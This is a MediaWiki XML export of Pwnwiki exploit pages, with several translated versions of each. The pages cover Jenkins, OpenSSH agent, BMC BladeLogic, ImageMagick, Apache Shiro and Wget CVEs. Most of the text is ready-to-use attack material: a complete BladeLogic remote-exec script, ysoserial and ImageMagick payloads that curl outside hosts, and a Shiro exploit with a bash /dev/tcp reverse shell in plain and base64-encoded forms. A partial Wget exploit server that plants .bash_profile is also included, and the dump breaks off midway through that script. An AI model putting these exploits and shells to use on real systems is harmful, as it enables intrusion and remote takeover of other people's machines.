&lt;/translate&gt;</text>
      <sha1>oihow64hek332i6zl1l7eypx34hru04</sha1>
    </revision>
    <revision>
      <id>245</id>
      <parentid>244</parentid>
      <timestamp>2021-03-09T07:51:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>245</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="669" sha1="1nuni5hrn5y8rq6p68uskyrd2vkrva9" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==簡介== &lt;!--T:1--&gt;
CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模塊中存在安全漏洞。遠程攻擊者可通過打開JRMP監聽程序利用該漏洞執行任意代碼。

&lt;!--T:2--&gt;
利用需要X-Jenkins-CLI2-Port對應的端口，如果Jenkins無法獲取CLI版本2的端口標頭&lt;code&gt;X-Jenkins-CLI2-Port&lt;/code&gt;它會退回到版本1。

==利用ys生成二進製文件== &lt;!--T:3--&gt;
&lt;pre&gt;
java -jar ysoserial.jar CommonsCollections3 "curl http://r9rub4.ceye.io/" &gt; payload.bin
&lt;/pre&gt;

==利用腳本== &lt;!--T:4--&gt;
https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py

&lt;/translate&gt;</text>
      <sha1>1nuni5hrn5y8rq6p68uskyrd2vkrva9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-0788 Jenkins CI和LTS 遠程代碼執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3068</id>
    <revision>
      <id>3569</id>
      <timestamp>2021-05-26T13:46:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==簡介== CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模塊中存在安全漏洞。遠程攻擊者可通過打開JRMP監聽程序利用該漏洞..."</comment>
      <origin>3569</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="599" sha1="q2nsa8jmeigibic11pc75oa00qe6mio" xml:space="preserve">&lt;languages  /&gt;
==簡介==
CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模塊中存在安全漏洞。遠程攻擊者可通過打開JRMP監聽程序利用該漏洞執行任意代碼。

利用需要X-Jenkins-CLI2-Port對應的端口，如果Jenkins無法獲取CLI版本2的端口標頭&lt;code&gt;X-Jenkins-CLI2-Port&lt;/code&gt;它會退回到版本1。

==利用ys生成二進製文件==
&lt;pre&gt;
java -jar ysoserial.jar CommonsCollections3 "curl http://r9rub4.ceye.io/" &gt; payload.bin
&lt;/pre&gt;

==利用腳本==
https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py</text>
      <sha1>q2nsa8jmeigibic11pc75oa00qe6mio</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-0792 低權限用戶命令執行漏洞</title>
    <ns>0</ns>
    <id>155</id>
    <revision>
      <id>251</id>
      <timestamp>2021-03-09T07:53:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==影響版本== &lt;/translate&gt; jenkins&lt;1.650  ==EXP== https://github.com/jpiechowka/jenkins-cve-2016-0792"</comment>
      <origin>251</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="132" sha1="ko2ifc4q7gr69rnry3g3chd828yyydy" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
jenkins&lt;1.650

==EXP==
https://github.com/jpiechowka/jenkins-cve-2016-0792</text>
      <sha1>ko2ifc4q7gr69rnry3g3chd828yyydy</sha1>
    </revision>
    <revision>
      <id>252</id>
      <parentid>251</parentid>
      <timestamp>2021-03-09T07:53:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>252</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="143" sha1="9uiatwamhff1vs4p2s7i299jgbswir9" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
jenkins&lt;1.650

==EXP==
https://github.com/jpiechowka/jenkins-cve-2016-0792</text>
      <sha1>9uiatwamhff1vs4p2s7i299jgbswir9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-0792 低權限用戶命令執行漏洞/zh-hans</title>
    <ns>0</ns>
    <id>4234</id>
    <revision>
      <id>4870</id>
      <timestamp>2021-06-12T09:35:46Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "CVE-2016-0792 低权限用户命令执行漏洞"</comment>
      <origin>4870</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="107" sha1="fapx3e0ualer40r1kzeaklpn0i6oobf" xml:space="preserve">&lt;languages  /&gt;

==影响版本==
jenkins&lt;1.650

==EXP==
https://github.com/jpiechowka/jenkins-cve-2016-0792</text>
      <sha1>fapx3e0ualer40r1kzeaklpn0i6oobf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-0792 低權限用戶命令執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>4229</id>
    <revision>
      <id>4863</id>
      <timestamp>2021-06-12T09:32:20Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "CVE-2016-0792 低权限用户命令执行漏洞"</comment>
      <origin>4863</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="168" sha1="foych22jnrnv7bxw5wzh8sc2ihofyzi" xml:space="preserve">&lt;languages  /&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==影響版本==
&lt;/div&gt;
jenkins&lt;1.650

==EXP==
https://github.com/jpiechowka/jenkins-cve-2016-0792</text>
      <sha1>foych22jnrnv7bxw5wzh8sc2ihofyzi</sha1>
    </revision>
    <revision>
      <id>4869</id>
      <parentid>4863</parentid>
      <timestamp>2021-06-12T09:33:12Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <origin>4869</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="107" sha1="ff04dnq26yg8vjq8jn9r0b0kew98hjc" xml:space="preserve">&lt;languages  /&gt;

==影響版本==
jenkins&lt;1.650

==EXP==
https://github.com/jpiechowka/jenkins-cve-2016-0792</text>
      <sha1>ff04dnq26yg8vjq8jn9r0b0kew98hjc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-0800 SSLv2 協議漏洞</title>
    <ns>0</ns>
    <id>1405</id>
    <revision>
      <id>1773</id>
      <timestamp>2021-04-20T06:13:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Tool== https://github.com/drwetter/testssl.sh  ==Usage== &lt;pre&gt; ./testssl.sh -D &lt;IP ADDRESS&gt; &lt;/pre&gt;"</comment>
      <origin>1773</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="100" sha1="j3jnbhvel5wts3c9lo35q1fsyqn0ueq" xml:space="preserve">==Tool==
https://github.com/drwetter/testssl.sh

==Usage==
&lt;pre&gt;
./testssl.sh -D &lt;IP ADDRESS&gt;
&lt;/pre&gt;</text>
      <sha1>j3jnbhvel5wts3c9lo35q1fsyqn0ueq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-10009 OpenSSH 小於 7.4 agent Protocol Arbitrary Library Loading漏洞</title>
    <ns>0</ns>
    <id>2304</id>
    <revision>
      <id>2740</id>
      <timestamp>2021-05-08T08:49:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1009  The OpenSSH agent permits its clients to load PKCS11 providers using the commands SSH_AGE..."</comment>
      <origin>2740</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2056" sha1="49fxhoxv339qgcmq6q49wgs3j3vhd2y" xml:space="preserve">==EXP==
&lt;pre&gt;
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1009

The OpenSSH agent permits its clients to load PKCS11 providers using the commands SSH_AGENTC_ADD_SMARTCARD_KEY and SSH_AGENTC_ADD_SMARTCARD_KEY_CONSTRAINED if OpenSSH was compiled with the ENABLE_PKCS11 flag (normally enabled) and the agent isn't locked. For these commands, the client has to specify a provider name. The agent passes this provider name to a subprocess (via ssh-agent.c:process_add_smartcard_key -&gt; ssh-pkcs11-client.c:pkcs11_add_provider -&gt; ssh-pkcs11-client.c:send_msg), and the subprocess receives it and passes it to dlopen() (via ssh-pkcs11-helper.c:process -&gt; ssh-pkcs11-helper.c:process_add -&gt; ssh-pkcs11.c:pkcs11_add_provider -&gt; dlopen). No checks are performed on the provider name, apart from testing whether that provider is already loaded.

This means that, if a user connects to a malicious SSH server with agent forwarding enabled and the malicious server has the ability to place a file with attacker-controlled contents in the victim's filesystem, the SSH server can execute code on the user's machine.

To reproduce the issue, first create a library that executes some command when it is loaded:

$ cat evil_lib.c
#include &lt;stdlib.h&gt;
__attribute__((constructor)) static void run(void) {
  // in case you're loading this via LD_PRELOAD or LD_LIBRARY_PATH,
  // prevent recursion through system()
  unsetenv("LD_PRELOAD");
  unsetenv("LD_LIBRARY_PATH");
  system("id &gt; /tmp/test");
}
$ gcc -shared -o evil_lib.so evil_lib.c -fPIC -Wall

Connect to another machine using "ssh -A". Then, on the remote machine:

$ ssh-add -s [...]/evil_lib.so
Enter passphrase for PKCS#11: [just press enter here]
SSH_AGENT_FAILURE
Could not add card: [...]/evil_lib.so

At this point, the command "id &gt; /tmp/test" has been executed on the machine running the ssh agent:

$ cat /tmp/test
uid=1000(user) gid=1000(user) groups=[...]


Fixed in http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.214&amp;r2=1.215&amp;f=h
            
&lt;/pre&gt;</text>
      <sha1>49fxhoxv339qgcmq6q49wgs3j3vhd2y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-1542 BMC BladeLogic 8.3.00.64 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1227</id>
    <revision>
      <id>1532</id>
      <timestamp>2021-04-11T02:12:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: BMC BladeLogic RSCD agent remote exec - XMLRPC version # Filename: BMC_rexec.py # Github: https://github.com/bao7uo/bmc_bladelogic # Date: 2018-..."</comment>
      <origin>1532</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4007" sha1="f96wxtpu73nx6grm2e3icgfqo1gzpqe" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: BMC BladeLogic RSCD agent remote exec - XMLRPC version
# Filename: BMC_rexec.py
# Github: https://github.com/bao7uo/bmc_bladelogic
# Date: 2018-01-24
# Exploit Author: Paul Taylor / Foregenix Ltd
# Website: http://www.foregenix.com/blog
# Version: BMC RSCD agent 8.3.00.64
# CVE: CVE-2016-1542 (BMC-2015-0010), CVE-2016-1543 (BMC-2015-0011)
# Vendor Advisory: https://docs.bmc.com/docs/ServerAutomation/87/release-notes-and-notices/flashes/notification-of-critical-security-issue-in-bmc-server-automation-cve-2016-1542-cve-2016-1543
# Tested on: 8.3.00.64
 
#!/usr/bin/python
 
# BMC BladeLogic RSCD agent remote exec - XMLRPC version
# CVE: CVE-2016-1542 (BMC-2015-0010), CVE-2016-1543 (BMC-2015-0011)
 
# By Paul Taylor / Foregenix Ltd
 
# Credit: https://github.com/ernw/insinuator-snippets/tree/master/bmc_bladelogic
# Credit: https://github.com/yaolga
 
# Credit: Nick Bloor for AWS image for testing :-)
# https://github.com/NickstaDB/PoC/tree/master/BMC_RSCD_RCE
 
import socket
import ssl
import sys
import argparse
import requests
import httplib
from requests.packages.urllib3 import PoolManager
from requests.packages.urllib3.connection import HTTPConnection
from requests.packages.urllib3.connectionpool import HTTPConnectionPool
from requests.adapters import HTTPAdapter
 
 
class MyHTTPConnection(HTTPConnection):
    def __init__(self, unix_socket_url, timeout=60):
        HTTPConnection.__init__(self, HOST, timeout=timeout)
        self.unix_socket_url = unix_socket_url
        self.timeout = timeout
 
    def connect(self):
        self.sock = wrappedSocket
 
 
class MyHTTPConnectionPool(HTTPConnectionPool):
    def __init__(self, socket_path, timeout=60):
        HTTPConnectionPool.__init__(self, HOST, timeout=timeout)
        self.socket_path = socket_path
        self.timeout = timeout
 
    def _new_conn(self):
        return MyHTTPConnection(self.socket_path, self.timeout)
 
 
class MyAdapter(HTTPAdapter):
    def __init__(self, timeout=60):
        super(MyAdapter, self).__init__()
        self.timeout = timeout
 
    def get_connection(self, socket_path, proxies=None):
        return MyHTTPConnectionPool(socket_path, self.timeout)
 
    def request_url(self, request, proxies):
        return request.path_url
 
 
def optParser():
    parser = argparse.ArgumentParser(
                        description="Remote exec " +
                        "BladeLogic Server Automation RSCD agent"
                    )
    parser.add_argument("host", help="IP address of a target system")
    parser.add_argument(
            "-p",
            "--port",
            type=int,
            default=4750,
            help="TCP port (default: 4750)"
            )
    parser.add_argument("command", help="Command to execute")
    opts = parser.parse_args()
    return opts
 
 
def sendXMLRPC(host, port, packet, tlsrequest):
    r = tlsrequest.post(
            'http://' + host + ':' + str(port) + '/xmlrpc', data=packet
        )
    print r.status_code
    print r.content
    return
 
 
intro = """&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;methodCall&gt;&lt;methodName&gt;RemoteServer.intro&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;2016-1-14-18-10-30-3920958&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;7&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;0;0;21;AArverManagement_XXX_XXX:XXXXXXXX;2;CM;-;-;0;-;1;1;6;SYSTEM;CP1252;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;8.6.01.66&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;"""
options = optParser()
rexec = options.command
PORT = options.port
HOST = options.host
rexec = """&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;methodCall&gt;&lt;methodName&gt;RemoteExec.exec&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;""" + rexec  + """&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;"""
 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
 
sock.sendall("TLSRPC")
wrappedSocket = ssl.wrap_socket(sock)
 
adapter = MyAdapter()
s = requests.session()
s.mount("http://", adapter)
 
sendXMLRPC(HOST, PORT, intro, s)
sendXMLRPC(HOST, PORT, rexec, s)
 
wrappedSocket.close()
&lt;/pre&gt;</text>
      <sha1>f96wxtpu73nx6grm2e3icgfqo1gzpqe</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-2183 SSL/TLS協議信息洩露漏洞</title>
    <ns>0</ns>
    <id>1404</id>
    <revision>
      <id>1771</id>
      <timestamp>2021-04-20T06:09:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Tool== https://github.com/drwetter/testssl.sh  ==Usage== ./testssl.sh -W &lt;IP ADDRESS&gt;"</comment>
      <origin>1771</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="87" sha1="f8m1tequl3qd6qc6wtqiwn2s4rbh90s" xml:space="preserve">==Tool==
https://github.com/drwetter/testssl.sh

==Usage==
./testssl.sh -W &lt;IP ADDRESS&gt;</text>
      <sha1>f8m1tequl3qd6qc6wtqiwn2s4rbh90s</sha1>
    </revision>
    <revision>
      <id>1772</id>
      <parentid>1771</parentid>
      <timestamp>2021-04-20T06:10:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>1772</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="98" sha1="q5a9su73e6fu0066iej1q4fepr00eer" xml:space="preserve">==Tool==
https://github.com/drwetter/testssl.sh

==Usage==
&lt;pre&gt;./testssl.sh -W &lt;IP ADDRESS&gt;&lt;/pre&gt;</text>
      <sha1>q5a9su73e6fu0066iej1q4fepr00eer</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-3714 ImageMagick 命令執行漏洞</title>
    <ns>0</ns>
    <id>5758</id>
    <revision>
      <id>6622</id>
      <timestamp>2021-07-10T06:15:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; mageMagick 6.5.7-8    ImageMagick 6.7.7-10    &lt;6.9.3-9 released    ==POC== &lt;pre&gt; push graphic-context viewbox 0 0 640 4..."</comment>
      <origin>6622</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="485" sha1="q0x5h0brfabew7tak6zoxrul6zzc2qw" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
mageMagick 6.5.7-8 


ImageMagick 6.7.7-10 


&lt;6.9.3-9 released 


==POC==
&lt;pre&gt;
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"| command")'
pop graphic-context
&lt;/pre&gt;

&lt;translate&gt;
圖片上傳點，抓包
&lt;/translate&gt;
&lt;pre&gt;
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"| curl 172.16.20.108:8888")'
pop graphic-context
&lt;/pre&gt;

&lt;translate&gt;
修改IP和端口爲監聽機器的IP和端口。
&lt;/translate&gt;</text>
      <sha1>q0x5h0brfabew7tak6zoxrul6zzc2qw</sha1>
    </revision>
    <revision>
      <id>6623</id>
      <parentid>6622</parentid>
      <timestamp>2021-07-10T06:15:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6623</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="518" sha1="kgz4ysywjwzhfksng6dp91ryllgbhs0" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
mageMagick 6.5.7-8 


ImageMagick 6.7.7-10 


&lt;6.9.3-9 released 


==POC==
&lt;pre&gt;
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"| command")'
pop graphic-context
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
圖片上傳點，抓包
&lt;/translate&gt;
&lt;pre&gt;
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"| curl 172.16.20.108:8888")'
pop graphic-context
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
修改IP和端口爲監聽機器的IP和端口。
&lt;/translate&gt;</text>
      <sha1>kgz4ysywjwzhfksng6dp91ryllgbhs0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-4437 Shiro反序列化漏洞</title>
    <ns>0</ns>
    <id>832</id>
    <revision>
      <id>1090</id>
      <timestamp>2021-04-07T05:20:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt;  ==POC== https://github.com/insightglacier/Shiro_exploit   &lt;translate&gt; ==漏洞利用== &lt;/translate&gt; &lt;pre&gt; python3 shiro_exploit.py -t 3 -u http://192.168.2.14..."</comment>
      <origin>1090</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="745" sha1="rwmoc9iyn19kag705fk7fqhxxz6jn41" xml:space="preserve">&lt;languages   /&gt;

==POC==
https://github.com/insightglacier/Shiro_exploit


&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;
&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "touch a.txt"
&lt;/pre&gt;

&lt;translate&gt;
命令執行成功。
&lt;/translate&gt;


==Getshell==
&lt;translate&gt;
監聽機器執行以下命令：
&lt;/translate&gt;
&lt;pre&gt;
nc -lvp 666
&lt;/pre&gt;

&lt;translate&gt;
受害機器執行以下命令：
&lt;/translate&gt;
&lt;pre&gt;
bash -i &gt;&amp; /dev/tcp/192.168.2.130/6666 0&gt;&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
&lt;/pre&gt;



&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}"
&lt;/pre&gt;</text>
      <sha1>rwmoc9iyn19kag705fk7fqhxxz6jn41</sha1>
    </revision>
    <revision>
      <id>1091</id>
      <parentid>1090</parentid>
      <timestamp>2021-04-07T05:21:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1091</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="789" sha1="sch0rbckela2peybg1p89qge8okxm5u" xml:space="preserve">&lt;languages   /&gt;

==POC==
https://github.com/insightglacier/Shiro_exploit


&lt;translate&gt;
==漏洞利用== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "touch a.txt"
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
命令執行成功。
&lt;/translate&gt;


==Getshell==
&lt;translate&gt;
&lt;!--T:3--&gt;
監聽機器執行以下命令：
&lt;/translate&gt;
&lt;pre&gt;
nc -lvp 666
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:4--&gt;
受害機器執行以下命令：
&lt;/translate&gt;
&lt;pre&gt;
bash -i &gt;&amp; /dev/tcp/192.168.2.130/6666 0&gt;&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
&lt;/pre&gt;



&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}"
&lt;/pre&gt;</text>
      <sha1>sch0rbckela2peybg1p89qge8okxm5u</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-4437 Shiro反序列化漏洞/id</title>
    <ns>0</ns>
    <id>2834</id>
    <revision>
      <id>3335</id>
      <timestamp>2021-05-26T13:18:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Perintah berhasil dijalankan."</comment>
      <origin>3335</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="674" sha1="qzmzondx0qvd2u6lymxanix8r0fxxt0" xml:space="preserve">&lt;languages   /&gt;

==POC==
https://github.com/insightglacier/Shiro_exploit


== Eksploitasi ==
&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "touch a.txt"
&lt;/pre&gt;

Perintah berhasil dijalankan.


==Getshell==
Mesin pemantau menjalankan perintah berikut:
&lt;pre&gt;
nc -lvp 666
&lt;/pre&gt;

Mesin korban menjalankan perintah berikut:
&lt;pre&gt;
bash -i &gt;&amp; /dev/tcp/192.168.2.130/6666 0&gt;&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
&lt;/pre&gt;



&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}"
&lt;/pre&gt;</text>
      <sha1>qzmzondx0qvd2u6lymxanix8r0fxxt0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-4437 Shiro反序列化漏洞/ru</title>
    <ns>0</ns>
    <id>1424</id>
    <revision>
      <id>1796</id>
      <timestamp>2021-04-20T07:42:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Машина-жертва выполняет следующую команду:"</comment>
      <origin>1796</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="806" sha1="orb8fdazmi58p03bo4lh8ap0qzpndgu" xml:space="preserve">&lt;languages   /&gt;

==POC==
https://github.com/insightglacier/Shiro_exploit


==Эксплуатация уязвимостей==
&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "touch a.txt"
&lt;/pre&gt;

==Команда была выполнена успешно.==


==Getshell==
Слушатель выполняет следующие команды:
&lt;pre&gt;
nc -lvp 666
&lt;/pre&gt;

Машина-жертва выполняет следующую команду:
&lt;pre&gt;
bash -i &gt;&amp; /dev/tcp/192.168.2.130/6666 0&gt;&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
&lt;/pre&gt;



&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}"
&lt;/pre&gt;</text>
      <sha1>orb8fdazmi58p03bo4lh8ap0qzpndgu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-4437 Shiro反序列化漏洞/zh-hans</title>
    <ns>0</ns>
    <id>4233</id>
    <revision>
      <id>4868</id>
      <timestamp>2021-06-12T09:33:09Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "CVE-2016-4437 Shiro反序列化漏洞"</comment>
      <origin>4868</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="645" sha1="b8wgdtxpvuwje550f3xpy1chf0qqua9" xml:space="preserve">&lt;languages   /&gt;

==POC==
https://github.com/insightglacier/Shiro_exploit


==漏洞利用==
&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "touch a.txt"
&lt;/pre&gt;

命令执行成功。


==Getshell==
监听机器执行以下命令：
&lt;pre&gt;
nc -lvp 666
&lt;/pre&gt;

受害机器执行以下命令：
&lt;pre&gt;
bash -i &gt;&amp; /dev/tcp/192.168.2.130/6666 0&gt;&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
&lt;/pre&gt;



&lt;pre&gt;
python3 shiro_exploit.py -t 3 -u http://192.168.2.147:8080 -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTMwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}"
&lt;/pre&gt;</text>
      <sha1>b8wgdtxpvuwje550f3xpy1chf0qqua9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-4971 Wget小於1.18 任意文件上傳&amp;遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1569</id>
    <revision>
      <id>1965</id>
      <timestamp>2021-04-30T14:26:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution (2) # Original Exploit Author: Dawid Golunski # Exploit Author: liewehacksie # V..."</comment>
      <origin>1965</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1683" sha1="88jw5byqamroincai4whhmfyepgcw5e" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution (2)
# Original Exploit Author: Dawid Golunski
# Exploit Author: liewehacksie
# Version: GNU Wget &lt; 1.18 
# CVE: CVE-2016-4971

import http.server
import socketserver
import socket
import sys

class wgetExploit(http.server.SimpleHTTPRequestHandler):

   def do_GET(self):
       # This takes care of sending .wgetrc/.bash_profile/$file

       print("We have a volunteer requesting " + self.path + " by GET :)\n")
       if "Wget" not in self.headers.get('User-Agent'):
          print("But it's not a Wget :( \n")
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       self.send_response(301)
       print("Uploading " + str(FILE) + "via ftp redirect vuln. It should land in /home/ \n")
       new_path = 'ftp://anonymous@{}:{}/{}'.format(FTP_HOST, FTP_PORT, FILE)

       print("Sending redirect to %s \n"%(new_path))
       self.send_header('Location', new_path)
       self.end_headers()


HTTP_LISTEN_IP = '192.168.72.2'
HTTP_LISTEN_PORT = 80
FTP_HOST = '192.168.72.4'
FTP_PORT = 2121
FILE = '.bash_profile'

